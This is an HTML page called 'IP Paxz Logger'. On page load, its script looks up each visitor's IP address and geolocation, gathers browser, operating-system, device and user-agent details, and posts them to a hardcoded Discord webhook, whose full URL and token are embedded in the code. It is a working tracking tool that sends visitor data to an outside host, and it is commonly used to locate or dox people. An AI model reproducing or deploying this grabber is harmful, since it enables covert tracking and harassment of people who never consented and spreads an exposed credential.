<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Paxz Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: white;
            color: black;
            animation: changeBackground 0.4s infinite;
            position: relative;
        }
        h1 {
            color: inherit;
        }
        p {
            color: inherit;
            margin-bottom: 40px;
        }
        @keyframes changeBackground {
            0% { background-color: white; color: black; }
            50% { background-color: black; color: white; }
            100% { background-color: white; color: black; }
        }
    </style>
</head>
<body>
    <h1>Welcome to our awesome site!</h1>
    <p>Enjoy the music while we log your IP address.</p>
    
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            playMusic();
            logIpAddress();
        });

        function playMusic() {
            var audio = new Audio('music.mp3');
            audio.play();
            audio.addEventListener('ended', function() {
                this.currentTime = 0;
                this.play();
            }, false);
        }

        function logIpAddress() {
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(data => {
                    var ipAddress = data.ip;
                    var locationData = {
                        "City": data.city,
                        "Region": data.region,
                        "Country": data.country_name,
                        "Country Code": data.country,
                        "Continent Code": data.continent_code,
                        "Timezone": data.timezone,
                        "Currency": data.currency,
                        "Language": data.languages,
                        "ASN": data.asn,
                        "Organization": data.org
                    };

                    sendToDiscord(ipAddress, locationData);
                })
                .catch(error => console.error('Error fetching IP address:', error));
        }

        function sendToDiscord(ipAddress, locationData) {
            var embedData = {
                "IP Address": ipAddress,
                "City": locationData.City || "Unknown",
                "Region": locationData.Region || "Unknown",
                "Country": locationData.Country || "Unknown",
                "Country Code": locationData["Country Code"] || "Unknown",
                "Continent Code": locationData["Continent Code"] || "Unknown",
                "Timezone": locationData.Timezone || "Unknown",
                "Currency": locationData.Currency || "Unknown",
                "Language": locationData.Language || "Unknown",
                "ASN": locationData.ASN || "Unknown",
                "Organization": locationData.Organization || "Unknown"
            };

            var embed = createEmbed(embedData);
            sendEmbed(embed);
        }

        function createEmbed(embedData) {
            var userAgent = navigator.userAgent;
            var timestamp = new Date().toISOString();
            var os = detectOS(userAgent);
            var browser = detectBrowser(userAgent);
            var deviceType = getDeviceType();

            var embed = {
                "embeds": [
                    {
                        "title": "IP Paxz Logger",
                        "description": "A user has visited the page.",
                        "color": 65280,
                        "fields": [
                            { "name": "IP Address", "value": "```" + embedData["IP Address"] + "```" },
                            { "name": "City", "value": "```" + embedData.City + "```" },
                            { "name": "Region", "value": "```" + embedData.Region + "```" },
                            { "name": "Country", "value": "```" + embedData.Country + "```" },
                            { "name": "Country Code", "value": "```" + embedData["Country Code"] + "```" },
                            { "name": "Continent Code", "value": "```" + embedData["Continent Code"] + "```" },
                            { "name": "Timezone", "value": "```" + embedData.Timezone + "```" },
                            { "name": "Currency", "value": "```" + embedData.Currency + "```" },
                            { "name": "Language", "value": "```" + embedData.Language + "```" },
                            { "name": "ASN", "value": "```" + embedData.ASN + "```" },
                            { "name": "Organization", "value": "```" + embedData.Organization + "```" },
                            { "name": "Operating System", "value": "```" + os + "```" },
                            { "name": "Browser", "value": "```" + browser + "```" },
                            { "name": "Device Type", "value": "```" + deviceType + "```" },
                            { "name": "User Agent", "value": "```" + userAgent + "```" },
                            { "name": "Timestamp", "value": "```" + timestamp + "```" }
                        ],
                        "footer": { "text": "Info generated by Paxz!!!" }
                    }
                ]
            };

            return embed;
        }

        function sendEmbed(embed) {
            var webhookURL = "https://discord.com/api/webhooks/1213815065594175538/5nAvt25ByKhCQHt-C2byxRp60Kxhrtof-RdQ249Fi5ySE8dRbRhASEuL_IVtwEh8-XlS";

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(embed)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Failed to send embed:', response.status, response.statusText);
                } else {
                    console.log('Embed sent successfully!');
                }
            })
            .catch(error => console.error('Error sending embed:', error));
        }

        function detectOS(userAgent) {
            var os;
            if (userAgent.includes("Windows")) {
                os = "Windows";
            } else if (userAgent.includes("Mac")) {
                os = "Mac OS";
            } else if (userAgent.includes("Linux")) {
                os = "Linux";
            } else {
                os = "Unknown OS";
            }
            return os;
        }

        function detectBrowser(userAgent) {
            var browser;
            if (userAgent.includes("Firefox")) {
                browser = "Firefox";
            } else if (userAgent.includes("Chrome")) {
                browser = "Chrome";
            } else if (userAgent.includes("Safari")) {
                browser = "Safari";
            } else if (userAgent.includes("Edge")) {
                browser = "Edge";
            } else {
                browser = "Unknown Browser";
            }
            return browser;
        }

        function getDeviceType() {
            var userAgent = navigator.userAgent;
            if (userAgent.includes("Mobile")) return "Phone";
            if (userAgent.includes("Tablet")) return "Tablet";
            if (userAgent.includes("Console")) return "Console";
            if (userAgent.includes("Windows")) return "PC / Computer";
            return "Unknown Device";
        }
    </script>
</body>
</html>
